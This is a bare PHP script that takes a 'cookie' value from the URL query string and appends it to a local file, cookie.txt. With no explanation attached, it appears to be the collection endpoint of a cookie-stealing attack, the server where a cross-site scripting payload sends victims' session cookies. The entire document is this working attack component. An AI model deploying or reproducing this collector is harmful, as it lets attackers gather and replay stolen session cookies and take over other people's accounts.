<?php 
$cookieVar = $_GET["cookie"]; file_put_contents("cookie.txt", "\n\n", FILE_APPEND); file_put_contents("cookie.txt", $cookieVar, FILE_APPEND); ?> 

